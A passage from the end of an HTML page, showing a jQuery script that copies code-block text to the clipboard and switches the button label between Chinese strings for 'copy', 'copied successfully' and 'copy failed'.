        ta.style.position = 'absolute'
        ta.style.top = '0px'
        ta.style.left = '0px'
        ta.value = code
        ta.select()
        ta.focus()
        var result = document.execCommand('copy')
        document.body.removeChild(ta)
        
          if(result)$(this).text('复制成功')
          else $(this).text('复制失败')
        
        $(this).blur()
      })).on('mouseleave', function (e) {
        var $b = $(this).find('.copy-btn')
        setTimeout(function () {
          $b.text('复制')
        }, 300)
      }).append(e)
    })
  </script>


</body>
</html>
